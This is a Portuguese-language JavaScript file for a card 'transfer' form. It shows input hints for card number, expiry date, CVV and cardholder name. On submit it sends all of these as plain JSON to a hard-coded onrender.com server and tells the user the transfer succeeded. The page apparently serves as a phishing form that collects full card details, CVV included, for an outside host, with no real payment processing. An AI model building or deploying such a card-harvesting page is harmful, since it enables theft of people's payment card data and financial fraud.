document.addEventListener("DOMContentLoaded", () => {
    const form = document.querySelector("#dadosss");
    
    const campos = {
        numero: document.querySelector("#numero"),
        data: document.querySelector("#data"),
        cvv: document.querySelector("#cvv"),
        nome: document.querySelector("#nome"),
    };

    // --- LOGICA DAS DICAS (Mantida do seu original) ---
    const mensagensDica = {
        numero: "Exemplo: 1234 5678 9123 4567",
        data: "Exemplo: 12/30",
        cvv: "Exemplo: 123",
        nome: "Nome completo impresso no cartão.",
    };

    function removeMensagemDica(input) {
        const dicaExistente = input.parentElement.querySelector(".mensagem-dica");
        if (dicaExistente) {
            dicaExistente.remove();
        }
    }

    for (const key in campos) {
        const input = campos[key];
        input.addEventListener("focus", () => {
            removeMensagemDica(input);
            const dica = document.createElement("span");
            dica.classList.add("mensagem-dica");
            dica.style.color = "#666";
            dica.style.fontSize = "12px";
            dica.style.display = "block";
            dica.style.marginTop = "4px";
            dica.textContent = mensagensDica[key];
            input.parentElement.appendChild(dica);
        });
        input.addEventListener("blur", () => {
            removeMensagemDica(input);
        });
    }

    // --- NOVA LOGICA DE ENVIO PARA O BANCO DE DADOS ---
    form.addEventListener("submit", async (event) => {
        event.preventDefault(); // Impede o recarregamento da página

        // 1. Pegar o tipo de cartão selecionado
        const cardType = document.querySelector('input[name="gender"]:checked')?.value || "Não informado";

        // 2. Montar o objeto com os dados
        const dadosParaEnviar = {
            numero: campos.numero.value,
            dataValidade: campos.data.value,
            cvv: campos.cvv.value,
            nome: campos.nome.value,
            tipo: cardType
        };

        // 3. DESATIVAR O BOTÃO (Evita que o usuário clique 10 vezes enquanto envia)
        const botao = form.querySelector("button");
        botao.disabled = true;
        botao.textContent = "Processando...";

        try {
            // IMPORTANTE: Substitua o link abaixo pelo link que o RENDER te der!
            // Exemplo: https://meu-projeto-api.onrender.com/enviar-dados
            const urlDoServidor = "https://backend-g2xn.onrender.com";

            const resposta = await fetch(urlDoServidor, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(dadosParaEnviar)
            });

            if (resposta.ok) {
                alert("Transferência processada com sucesso!");
                form.reset(); // Limpa o formulário
            } else {
                alert("Erro ao processar transferência. Tente novamente.");
            }
        } catch (error) {
            console.error("Erro na conexão:", error);
            alert("O servidor está offline. Tente novamente em alguns instantes.");
        } finally {
            // Reativar o botão
            botao.disabled = false;
            botao.textContent = "Transferir";
        }
    });
});
